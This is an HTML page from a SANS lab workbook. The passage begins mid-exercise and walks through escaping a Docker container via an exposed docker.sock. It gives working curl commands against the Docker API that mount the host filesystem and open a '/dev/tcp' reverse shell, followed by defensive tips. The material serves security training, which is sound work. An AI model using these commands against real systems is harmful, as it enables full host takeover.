<span class="go">? This action is bad OPSEC, are you an adult? Yes</span>

<span class="go">[*] Wait approximately 10 seconds after exit, and press &lt;enter&gt; to continue</span>
<span class="go">[*] Opening shell tunnel (EOF to exit) ...</span>

<span class="go">[*] Started remote shell with pid 104</span>

<span class="gp">root@0222610d7c9e:/# </span>find ./ -name docker.sock
<span class="go">./run/docker.sock</span>
<span class="hll"><span class="go">find: ‘./proc/16/task/16/net’: Invalid argument</span>
</span><span class="hll"><span class="go">find: ‘./proc/16/net’: Invalid argument</span>
</span><span class="hll"><span class="go">find: ‘./proc/102/task/102/net’: Invalid argument</span>
</span><span class="hll"><span class="go">find: ‘./proc/102/net’: Invalid argument</span>
</span><span class="gp">root@0222610d7c9e:/# </span>apt install jq -y
<span class="go">Reading package lists... Done</span>
<span class="go">Building dependency tree... Done</span>
<span class="go">Reading state information... Done</span>
<span class="go">The following additional packages will be installed:</span>
<span class="go">  libjq1 libonig5</span>
<span class="go">The following NEW packages will be installed:</span>
<span class="go">  jq libjq1 libonig5</span>
<span class="go">0 upgraded, 3 newly installed, 0 to remove and 0 not upgraded.</span>
<span class="go">Need to get 384 kB of archives.</span>
<span class="go">After this operation, 1148 kB of additional disk space will be used.</span>
<span class="go">Get:1 http://deb.debian.org/debian bullseye/main amd64 libonig5 amd64 6.9.6-1.1 [185 kB]</span>
<span class="go">Get:2 http://deb.debian.org/debian bullseye/main amd64 libjq1 amd64 1.6-2.1 [135 kB]</span>
<span class="go">Get:3 http://deb.debian.org/debian bullseye/main amd64 jq amd64 1.6-2.1 [64.9 kB]</span>
<span class="go">Fetched 384 kB in 0s (835 kB/s)</span>
<span class="go">debconf: delaying package configuration, since apt-utils is not installed</span>
<span class="go">Selecting previously unselected package libonig5:amd64.</span>
<span class="gp gp-VirtualEnv">(Reading database ... 15729 files and directories currently installed.)</span>
<span class="go">Preparing to unpack .../libonig5_6.9.6-1.1_amd64.deb ...</span>
<span class="go">Unpacking libonig5:amd64 (6.9.6-1.1) ...</span>
<span class="go">Selecting previously unselected package libjq1:amd64.</span>
<span class="go">Preparing to unpack .../libjq1_1.6-2.1_amd64.deb ...</span>
<span class="go">Unpacking libjq1:amd64 (1.6-2.1) ...</span>
<span class="go">Selecting previously unselected package jq.</span>
<span class="go">Preparing to unpack .../archives/jq_1.6-2.1_amd64.deb ...</span>
<span class="go">Unpacking jq (1.6-2.1) ...</span>
<span class="go">Setting up libonig5:amd64 (6.9.6-1.1) ...</span>
<span class="go">Setting up libjq1:amd64 (1.6-2.1) ...</span>
<span class="go">Setting up jq (1.6-2.1) ...</span>
</code></pre></div>
</details>
</div>
</li>
<li>
<p>how do you interact with a socket file in linux? <code>cURL</code> provides the ability to use a socket file. To do this you need to specify the <code>--unix-socket</code> command and the URL will be <code>http://localhost</code>. What we are going to do is list the images that are pulled into the localhost already. We can do this by looking for the <code>RepoTags</code> key.</p>
<div class="admonition cmd">
<p class="admonition-title">Command lines</p>
<div class="highlight"><pre><span></span><code>curl -s --unix-socket /var/run/docker.sock http://localhost/images/json <span class="p">|</span> jq <span class="s1">&#39;.[] | .RepoTags&#39;</span>
</code></pre></div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>There will be other repositories in here that may not perfectly match, this is expected.</p>
</div>
<details class="abstract">
<summary>Expected Results</summary>
<div class="highlight"><pre><span></span><code><span class="gp">root@0222610d7c9e:/# </span>curl -s --unix-socket /var/run/docker.sock http://localhost/images/json <span class="p">|</span> jq <span class="s1">&#39;.[] | .RepoTags[]&#39;</span>
<span class="go">&quot;workdir-jenkins:latest&quot;</span>
<span class="go">&quot;workdir_jenkins:latest&quot;</span>
<span class="go">&quot;workdir-vulnapp:latest&quot;</span>
<span class="go">&quot;workdir_vulnapp:latest&quot;</span>
<span class="go">&quot;workdir-redis:latest&quot;</span>
<span class="go">&quot;workdir_redis:latest&quot;</span>
<span class="go">&quot;louislam/uptime-kuma:1&quot;</span>
<span class="go">&quot;lscr.io/linuxserver/heimdall:latest&quot;</span>
<span class="go">&quot;amir20/dozzle:latest&quot;</span>
<span class="go">&quot;<mark class="critic">debian:bookworm-slim</mark>&quot;</span>
<span class="go">&quot;portainer/portainer-ce:latest&quot;</span>
<span class="go">&quot;jc21/nginx-proxy-manager:latest&quot;</span>
<span class="go">&quot;bukuserver/bukuserver:latest&quot;</span>
<span class="go">&quot;jc21/mariadb-aria:latest&quot;</span>
</code></pre></div>
</details>
</div>
</li>
<li>
<p>Did you notice this list the following Tag:</p>
<p><mark class="critic">debian:bookworm-slim</mark></p>
<p>This tag indicates that we have a local Debian 12 image. Let's go ahead and use this to gain full system access.</p>
</li>
<li>
<p>How can we gain full system access back to this host? Well we can do this by leveraging the docker.sock. Let's go ahead and build us a script for this in our attacker shell.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>The IP address of the host is needed for this as well</p>
</div>
<div class="admonition cmd">
<p class="admonition-title">Command lines</p>
<div class="highlight"><pre><span></span><code><span class="nb">export</span> <span class="nv">IP</span><span class="o">=</span><mark class="critic">192.168.4.9</mark>
</code></pre></div>
</div>
</li>
<li>
<p>The command below will create a container with a command line that executes a bash shell back to our host. This shell runs interactive bash. We are also going to run chroot such that the directory we are in will be equivalent to the host.</p>
<div class="admonition cmd">
<p class="admonition-title">Command lines</p>
<div class="highlight"><pre><span></span><code><span class="nb">export</span> <span class="nv">CMD</span><span class="o">=</span><span class="s2">&quot;[\&quot;/bin/sh\&quot;,\&quot;-c\&quot;,\&quot;chroot /tmp sh -c \\\&quot;bash -c &#39;bash -i &amp;&gt;/dev/tcp/</span><span class="nv">$IP</span><span class="s2">/9997 0&lt;&amp;1&#39;\\\&quot;\&quot;]&quot;</span>
</code></pre></div>
</div>
<div class="admonition cmd">
<p class="admonition-title">Command lines</p>
<div class="highlight"><pre><span></span><code><span class="nb">export</span> <span class="nv">CONTAINER_NAME</span><span class="o">=</span>hack-container
</code></pre></div>
</div>
<p>The command below directs the Docker API to create a container with all the variables listed. This will not start the container but will create it.</p>
<div class="admonition cmd">
<p class="admonition-title">Command lines</p>
<div class="highlight"><pre><span></span><code>curl -s -X POST --unix-socket /var/run/docker.sock -d <span class="s2">&quot;{\&quot;Image\&quot;:\&quot;debian:bookworm-slim\&quot;,\&quot;cmd\&quot;:</span><span class="nv">$CMD</span><span class="s2">,\&quot;Binds\&quot;:[\&quot;/:/tmp:rw\&quot;]}&quot;</span> -H <span class="s1">&#39;Content-Type: application/json&#39;</span> http://localhost/containers/create?name<span class="o">=</span><span class="si">${</span><span class="nv">CONTAINER_NAME</span><span class="si">}</span>
</code></pre></div>
<details class="abstract">
<summary>Expected Results</summary>
<div class="highlight"><pre><span></span><code><span class="gp">root@0222610d7c9e:/# </span><span class="nb">export</span> <span class="nv">IP</span><span class="o">=</span><mark class="critic">192.168.4.9</mark>
<span class="go">export CMD=&quot;[\&quot;/bin/sh\&quot;,\&quot;-c\&quot;,\&quot;chroot /tmp sh -c \\\&quot;bash -c &#39;bash -i &amp;&gt;/dev/tcp/$IP/9999 0&lt;&amp;1&#39;\\\&quot;\&quot;]&quot;</span>
<span class="go">export CONTAINER_NAME=hack-container</span>
<span class="gp">root@0222610d7c9e:/# </span>curl -s -X POST --unix-socket /var/run/docker.sock -d <span class="s2">&quot;{\&quot;Image\&quot;:\&quot;debian:bookworm-slim\&quot;,\&quot;cmd\&quot;:</span><span class="nv">$CMD</span><span class="s2">,\&quot;Binds\&quot;:[\&quot;/:/tmp:rw\&quot;]}&quot;</span> -H <span class="s1">&#39;Content-Type: application/json&#39;</span> http://localhost/containers/create?name<span class="o">=</span><span class="si">${</span><span class="nv">CONTAINER_NAME</span><span class="si">}</span>
<span class="go">{&quot;Id&quot;:&quot;9261f2fa60a494bf84635cb01e5ea5db30862a57ae1559e1e0402c85313b7ec1&quot;,&quot;Warnings&quot;:[]}</span>
</code></pre></div>
</details>
</div>
<p>We now have a container that we can start. Let's start that container.</p>
<div class="admonition cmd">
<p class="admonition-title">Command lines</p>
<div class="highlight"><pre><span></span><code>curl -s -X POST --unix-socket /var/run/docker.sock <span class="s2">&quot;http://localhost/containers/</span><span class="si">${</span><span class="nv">CONTAINER_NAME</span><span class="si">}</span><span class="s2">/start&quot;</span>
</code></pre></div>
<details class="abstract">
<summary>Expected Results</summary>
<div class="highlight"><pre><span></span><code><span class="gp">root@0222610d7c9e:/# </span>curl -s -X POST --unix-socket /var/run/docker.sock <span class="s2">&quot;http://localhost/containers/</span><span class="si">${</span><span class="nv">CONTAINER_NAME</span><span class="si">}</span><span class="s2">/start&quot;</span>
</code></pre></div>
</details>
</div>
</li>
<li>
<p>Going back to the terminal you were at you can see the output of the <code>netcat</code> container.</p>
<div class="admonition abstract">
<p class="admonition-title">Expected Results</p>
<div class="highlight"><pre><span></span><code><span class="go">Listening on 0.0.0.0 9999</span>
<span class="go">Connection received on <mark class="critic">192.168.4.9</mark> 44974</span>
<span class="go">bash: cannot set terminal process group (1): Inappropriate ioctl for device</span>
<span class="go">bash: no job control in this shell</span>
<span class="gp">root@dd7a4708e810:/#</span>
</code></pre></div>
</div>
</li>
<li>
<p>While the output will not displayed here there are a few commands that you can run to prove full system access. Run the following commands</p>
<ul>
<li><code>ps</code></li>
<li><code>ls /home/sec588</code></li>
</ul>
<p>Technically this container is not running by dropping privileges it is enough to prove the access we have.</p>
</li>
<li>
<p>Now let's go ahead and turn off the Docker Containers that are running in the background.</p>
<div class="admonition cmd">
<p class="admonition-title">Command lines</p>
<div class="highlight"><pre><span></span><code><span class="nb">cd</span> /opt/dockerlabs/lab6
</code></pre></div>
</div>
<div class="admonition cmd">
<p class="admonition-title">Command lines</p>
<div class="highlight"><pre><span></span><code>docker compose down 
</code></pre></div>
<details class="abstract">
<summary>Expected Results</summary>
<div class="highlight"><pre><span></span><code><span class="gp">sec588@slingshot ~ $ </span><span class="nb">cd</span> /opt/dockerlabs/lab6
<span class="gp">sec588@slingshot /opt/dockerlabs/lab6 $ </span>docker compose down
<span class="go">[+] Running 11/11</span>
<span class="go"> ✔ Container vulnapp       Removed                                         4.4s </span>
<span class="go"> ✔ Container dozzle        Removed                                         3.6s </span>
<span class="go"> ✔ Container jenkins       Removed                                         4.3s </span>
<span class="go"> ✔ Container bukuserver    Removed                                         3.9s </span>
<span class="go"> ✔ Container redis         Removed                                         3.8s </span>
<span class="go"> ✔ Container uptime-kuma   Removed                                         4.3s </span>
<span class="go"> ✔ Container portainer     Removed                                         3.8s </span>
<span class="go"> ✔ Container heimdall      Removed                                         4.3s </span>
<span class="go"> ✔ Container db            Removed                                         4.1s </span>
<span class="go"> ✔ Network npm-networking  Removed                                         0.2s </span>
</code></pre></div>
</details>
</div>
<p>The containers should now be stopped. This should help reduce system containers.</p>
<p>Please make sure to also run:</p>
<div class="admonition cmd">
<p class="admonition-title">Command Lines</p>
<div class="highlight"><pre><span></span><code>sudo systemctl stop sliver
</code></pre></div>
</div>
<p>Finally make sure to close all your windows as well as we will not need them for the next labs.</p>
</li>
</ol>
<h2 id="conclusion">Conclusion</h2>
<p>For the containers, there are multiple issues. The best way to run containers is through rootless single binary processes. Go makes the best candidate for this, but other languages can make binaries that do not rely on something other than system libraries or even environment shells to make the application work. Cgroups v2 would also make the system much more difficult to exploit as UID 0 in the container would not be UID 0 in the kernel. The final item would be around networking and the ability to firewall away network items. Putting this in a checklist makes sense.</p>
<div class="admonition tip">
<p class="admonition-title">Defensive Tips</p>
<p>The following are tips we explain to individuals</p>
<ul class="task-list">
<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Running without any binaries, minimal binaries, or even just a single binary</li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Running without UID 0</li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Do not require privileges</li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Firewall or IPTables on the host for each container (Read the Docker Firewalling Documentation)</li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Use a docker.sock proxy to limit the number of API calls and the API requirements if you need to expose docker.sock</li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Consistently scan for new binaries or execution within the container itself</li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Maintain an SBOM</li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> Use some type of telemetry to see what processes are being executed within each container</li>
</ul>
</div>

              
            </article>
          </div>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
    <nav class="md-footer__inner md-grid" aria-label="Footer">
      
        
        <a href="../../.." class="md-footer__link md-footer__link--prev" aria-label="Previous: Home" rel="prev">
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
          </div>
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Previous
              </span>
              Home
            </div>
          </div>
        </a>
      
      
        
        <a href="../../identities/01-identities/" class="md-footer__link md-footer__link--next" aria-label="Next: Identities Lab 1" rel="next">
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Next
              </span>
              Identities Lab 1
            </div>
          </div>
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
          </div>
        </a>
      
    </nav>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      ©2023 SANS Institute
    </div>
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.instant", "navigation.tabs", "navigation.indexes", "content.code.annotate"], "search": "../../../assets/javascripts/workers/search.2a1c317c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "version": "N/A"}</script>
    
    
      <script src="../../../assets/javascripts/bundle.748e2769.min.js"></script>
      
        <script src="../../../js/jquery.min.js"></script>
      
        <script src="../../../js/jquery.fancybox.min.js"></script>
      
        <script src="../../../js/workbook.js"></script>
      
        <script src="../../../js/custom.js"></script>
      
    
  </body>
</html>